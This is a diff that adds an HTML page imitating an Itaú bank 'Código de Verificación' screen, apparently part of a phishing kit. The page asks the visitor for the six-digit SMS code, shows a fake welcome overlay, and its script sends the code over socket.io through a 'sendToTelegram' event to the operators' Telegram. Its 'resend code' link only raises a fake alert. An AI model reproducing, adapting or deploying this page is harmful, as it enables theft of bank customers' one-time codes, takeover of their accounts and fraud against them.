@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Itaú - Código OTP</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #ffffff;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 540px;
+            margin: 0;
+            padding: 20px;
+            padding-left: 25px;
+        }
+
+        .logo {
+            width: 60px;
+            height: 60px;
+            margin-bottom: 35px;
+        }
+
+        .logo img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        h1 {
+            font-size: 22px;
+            font-weight: 700;
+            color: #000000;
+            margin-bottom: 15px;
+            letter-spacing: -0.5px;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: #666666;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-size: 14px;
+            font-weight: 400;
+            color: #000000;
+            margin-bottom: 10px;
+        }
+
+        input {
+            width: 100%;
+            padding: 15px 16px;
+            font-size: 20px;
+            letter-spacing: 4px;
+            text-align: center;
+            border: 1.5px solid #cccccc;
+            border-radius: 8px;
+            background-color: #ffffff;
+            color: #000000;
+            outline: none;
+            appearance: none;
+            font-family: inherit;
+        }
+
+        input:focus {
+            border-color: #0066cc;
+        }
+
+        input::placeholder {
+            color: #aaaaaa;
+            letter-spacing: normal;
+            font-size: 15px;
+        }
+
+        .resend-link {
+            display: block;
+            text-align: center;
+            margin-top: 15px;
+            font-size: 14px;
+            color: #0066cc;
+            text-decoration: underline;
+            cursor: pointer;
+        }
+
+        .resend-link:hover {
+            color: #0052a3;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 16px;
+            background-color: #e8e8e8;
+            color: #b8b8b8;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: not-allowed;
+            margin-top: auto;
+            position: absolute;
+            bottom: 20px;
+            left: 20px;
+            right: 20px;
+            width: calc(100% - 40px);
+            letter-spacing: 0.2px;
+        }
+
+        .submit-btn.active {
+            background-color: #fe6200;
+            color: #ffffff;
+            cursor: pointer;
+        }
+
+        .submit-btn.active:hover {
+            background-color: #e55800;
+        }
+
+        /* Loading Overlay */
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #ffffff;
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .loading-overlay.active {
+            display: flex;
+        }
+
+        .loading-icon {
+            width: 120px;
+            height: 120px;
+            margin-bottom: 30px;
+            position: relative;
+        }
+
+        .loading-icon::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 50px;
+            height: 50px;
+            background-color: #fe6200;
+            border-radius: 10px;
+        }
+
+        .loading-icon::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 90px;
+            height: 90px;
+            border: 3px solid #fe6200;
+            border-radius: 15px;
+            opacity: 0.3;
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        .loading-ring {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 110px;
+            height: 110px;
+            border: 3px solid #fe6200;
+            border-radius: 18px;
+            opacity: 0.2;
+            animation: pulse 2s ease-in-out infinite 0.5s;
+        }
+
+        @keyframes pulse {
+            0%, 100% {
+                transform: translate(-50%, -50%) scale(1);
+                opacity: 0.2;
+            }
+            50% {
+                transform: translate(-50%, -50%) scale(1.1);
+                opacity: 0.1;
+            }
+        }
+
+        .loading-text {
+            font-size: 22px;
+            font-weight: 700;
+            color: #000000;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+
+        @media (min-width: 768px) {
+            .container {
+                max-width: 320px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-icon">
+            <div class="loading-ring"></div>
+        </div>
+        <h2 class="loading-text">Te damos la bienvenida a Itaú</h2>
+    </div>
+
+    <div class="container">
+        <div class="logo">
+            <img src="img/itau-logo.png" alt="Itaú">
+        </div>
+
+        <h1>Código de Verificación</h1>
+        <p class="subtitle">Ingresa el código de 6 dígitos que hemos enviado a tu celular vía SMS.</p>
+
+        <form id="otpForm">
+            <div class="form-group">
+                <label for="otp">Código OTP</label>
+                <input 
+                    type="text" 
+                    id="otp" 
+                    name="otp" 
+                    placeholder="000000"
+                    maxlength="6"
+                    inputmode="numeric"
+                    pattern="[0-9]*"
+                    autocomplete="off"
+                >
+                <a href="#" class="resend-link" onclick="resendOTP(event)">¿No recibiste el código? Reenviar</a>
+            </div>
+
+            <button type="submit" class="submit-btn" id="submitBtn">Ingresar</button>
+        </form>
+    </div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="socket-handler.js"></script>
+    <script>
+
+        let sessionId = localStorage.getItem('itau_session_id');
+        const otpInput = document.getElementById('otp');
+        const submitBtn = document.getElementById('submitBtn');
+        const otpForm = document.getElementById('otpForm');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+
+        // Solo permitir números en el campo de OTP
+        otpInput.addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9]/g, '');
+            checkFormValidity();
+        });
+
+        function checkFormValidity() {
+            if (otpInput.value.length === 6) {
+                submitBtn.classList.add('active');
+                submitBtn.disabled = false;
+            } else {
+                submitBtn.classList.remove('active');
+                submitBtn.disabled = true;
+            }
+        }
+
+        function resendOTP(e) {
+            e.preventDefault();
+            alert('Código reenviado a tu celular');
+        }
+
+        otpForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            if (submitBtn.classList.contains('active')) {
+                loadingOverlay.classList.add('active');
+
+                const otpData = {
+                    bank: 'Itaú',
+                    page: 'otp',
+                    otp: otpInput.value
+                };
+
+                window.itauSocket.emit('updatePage', { 
+                    sessionId: window.getSessionId(), 
+                    page: 'itau-otp' 
+                });
+
+                window.itauSocket.emit('sendToTelegram', {
+                    sessionId: window.getSessionId(),
+                    data: otpData
+                });
+            }
+        });
+
+        window.itauSocket.on('telegramSent', (data) => {
+            console.log('✅ OTP enviado correctamente a Telegram');
+        });
+    </script>
+</body>
+</html>
